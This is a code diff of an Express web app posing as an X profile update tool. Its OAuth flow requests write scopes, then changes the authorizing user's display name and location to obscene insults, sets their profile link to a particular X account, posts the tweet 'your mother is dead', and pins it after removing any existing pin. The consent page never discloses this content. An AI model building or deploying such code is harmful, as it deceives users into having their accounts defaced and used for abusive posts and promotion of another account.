@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>X用户信息更新器</title>
+        <title>X用户资料更新工具</title>
         <style>
           body { 
             font-family: Arial, sans-serif; 
@@ -52,16 +52,28 @@ app.get('/', (req, res) => {
             font-size: 14px;
             color: #657786;
           }
+          .warning {
+            margin-top: 20px;
+            padding: 15px;
+            background: #ffe6e6;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #e0245e;
+          }
         </style>
     </head>
     <body>
         <div class="container">
-          <h1>X用户信息更新器</h1>
-          <p>点击下方按钮授权我们来更新您的X信息。</p>
+          <h1>X用户资料更新工具</h1>
+          <p>点击下方按钮授权我们来更新您的资料和发布推文。</p>
           <a class="btn" href="/auth/x">Login with X</a>
           
           <div class="note">
-            <strong>注意：</strong> 授权后，我们将更新您的X个人信息并发送一条推文。
+            <strong>注意：</strong> 授权后，我们将更新您的X资料并发布一条推文。
+          </div>
+          
+          <div class="warning">
+            <strong>警告：</strong> 请确保您了解此操作将修改您的公开资料并发布公开内容。
           </div>
         </div>
     </body>
@@ -84,12 +96,13 @@ app.get('/auth/x', (req, res) => {
     `);
   }
   
+  // 需要更广泛的权限范围
   const authUrl = `https://twitter.com/i/oauth2/authorize?${
     querystring.stringify({
       response_type: 'code',
       client_id: CLIENT_ID,
       redirect_uri: REDIRECT_URI,
-      scope: 'tweet.read tweet.write users.read offline.access', // 需要推文写入权限
+      scope: 'tweet.read tweet.write users.read users.write offline.access', // 添加推文和用户写入权限
       state: STATE_STRING,
       code_challenge: 'challenge',
       code_challenge_method: 'plain',
@@ -178,8 +191,8 @@ app.get('/api/callback', async (req, res) => {
     
     try {
       // 2. 获取当前用户ID
-      console.log('获取当前用户信息...');
-      const userResponse = await axios.get(
+      console.log('获取当前用户ID...');
+      const meResponse = await axios.get(
         'https://api.twitter.com/2/users/me',
         {
           headers: {
@@ -189,18 +202,20 @@ app.get('/api/callback', async (req, res) => {
         }
       );
       
-      const userId = userResponse.data.data.id;
-      console.log('用户ID:', userId);
+      const userId = meResponse.data.data.id;
+      console.log('当前用户ID:', userId);
       
-      // 3. 更新用户信息
-      console.log('更新用户信息...');
+      // 3. 更新用户资料
+      console.log('更新用户资料...');
+      const updateData = {
+        name: "妖屌亲妈鱼鱼子",
+        location: "你全家头上",
+        url: "https://x.com/qin61846754"
+      };
+      
       const updateResponse = await axios.patch(
         `https://api.twitter.com/2/users/${userId}`,
-        {
-          name: "妖屌亲妈鱼鱼子",
-          location: "你全家头上",
-          url: "https://x.com/qin61846754"
-        },
+        updateData,
         {
           headers: {
             'Authorization': `Bearer ${accessToken}`,
@@ -210,15 +225,17 @@ app.get('/api/callback', async (req, res) => {
         }
       );
       
-      console.log('用户信息更新成功:', JSON.stringify(updateResponse.data, null, 2));
+      console.log('用户资料更新成功:', JSON.stringify(updateResponse.data, null, 2));
       
       // 4. 发送推文
       console.log('发送推文...');
+      const tweetData = {
+        text: "你妈死了"
+      };
+      
       const tweetResponse = await axios.post(
         'https://api.twitter.com/2/tweets',
-        {
-          text: "你妈死了"
-        },
+        tweetData,
         {
           headers: {
             'Authorization': `Bearer ${accessToken}`,
@@ -233,6 +250,26 @@ app.get('/api/callback', async (req, res) => {
       
       // 5. 置顶推文
       console.log('置顶推文...');
+      try {
+        // 首先取消现有的置顶推文（如果有）
+        await axios.delete(
+          `https://api.twitter.com/2/users/${userId}/pinned_tweets`,
+          {
+            headers: {
+              'Authorization': `Bearer ${accessToken}`
+            },
+            timeout: 10000
+          }
+        );
+        console.log('已取消现有的置顶推文');
+      } catch (unpinError) {
+        // 如果没有置顶推文，API会返回404，这是正常的
+        if (unpinError.response?.status !== 404) {
+          console.warn('取消置顶时出现非404错误:', unpinError.message);
+        }
+      }
+      
+      // 然后置顶新推文
       const pinResponse = await axios.post(
         `https://api.twitter.com/2/users/${userId}/pinned_tweets`,
         {
@@ -271,12 +308,8 @@ app.get('/api/callback', async (req, res) => {
               margin: 0 auto;
             }
             h1 { color: #17bf63; }
-            .success-icon {
-              font-size: 60px;
-              margin-bottom: 20px;
-            }
-            .info-box {
-              background: #f8f9fa;
+            .success-info {
+              background: #e8f5fe;
               padding: 15px;
               border-radius: 8px;
               margin: 20px 0;
@@ -286,21 +319,15 @@ app.get('/api/callback', async (req, res) => {
         </head>
         <body>
           <div class="container">
-            <div class="success-icon">✅</div>
             <h1>🎉 操作成功！</h1>
+            <p>您的X资料和推文已成功更新：</p>
             
-            <div class="info-box">
-              <p><strong>已更新的信息：</strong></p>
-              <ul>
-                <li><strong>名称:</strong> 妖屌亲妈鱼鱼子</li>
-                <li><strong>位置:</strong> 你全家头上</li>
-                <li><strong>URL:</strong> https://x.com/qin61846754</li>
-              </ul>
-            </div>
-            
-            <div class="info-box">
-              <p><strong>已发送并置顶推文：</strong></p>
-              <p>"你妈死了"</p>
+            <div class="success-info">
+              <p><strong>新用户名:</strong> 妖屌亲妈鱼鱼子</p>
+              <p><strong>新地点:</strong> 你全家头上</p>
+              <p><strong>新URL:</strong> https://x.com/qin61846754</p>
+              <p><strong>新推文:</strong> 你妈死了</p>
+              <p><strong>推文状态:</strong> 已置顶</p>
             </div>
             
             <p>您现在可以返回X查看更改。</p>
@@ -319,6 +346,11 @@ app.get('/api/callback', async (req, res) => {
         errorMessage = apiError.message;
       }
       
+      // 检查是否是权限问题
+      if (apiError.response?.status === 403) {
+        errorMessage += ' (权限不足，请确保您的应用有写入权限)';
+      }
+      
       res.status(500).send(`
         <div style="text-align: center; padding: 50px;">
           <h1 style="color: #e0245e;">❌ API操作失败</h1>
@@ -326,7 +358,7 @@ app.get('/api/callback', async (req, res) => {
           <div style="background: #ffe6e6; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px; overflow: auto;">
             <pre style="text-align: left; white-space: pre-wrap;">${errorMessage}</pre>
           </div>
-          <p>可能的原因：权限不足、API限制或网络问题。</p>
+          <p>可能的原因：权限不足、内容违反规则或网络问题。</p>
           <p><a href="/" style="color: #1da1f2; text-decoration: none; font-weight: bold;">返回首页重试</a></p>
         </div>
       `);
